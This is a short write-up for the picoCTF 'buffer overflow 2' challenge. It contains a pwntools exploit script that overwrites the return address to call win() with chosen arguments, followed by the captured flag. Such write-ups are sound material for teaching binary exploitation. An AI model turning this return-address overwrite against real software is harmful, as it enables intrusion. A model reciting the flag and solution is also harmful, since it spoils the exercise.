# PicoCTF – buffer overflow 2

* **Category:** Binary Exploitation
* **Points:** 300 points

## Challenge

> Control the return address and arguments This time you'll need to control the arguments to the function you return to!
> Can you get the flag from this program? You can view source here. And connect with it using

## Solution

Calling conventions for x86

```python
from pwn import *
elf = context.binary = ELF('./vuln', checksec=False)
p = remote("saturn.picoctf.net", 52894)#process(['gdb','./vuln'])

offset = 112

p.recvline()
payload = flat(
        offset * b'A',
        0x8049296, # win()
        b"\x90" * 4,
        0xCAFEF00D,
        0xF00DF00D
)
p.clean()
p.sendline(payload)
p.recvline()
p.interactive()
```

```
Flag: picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
```
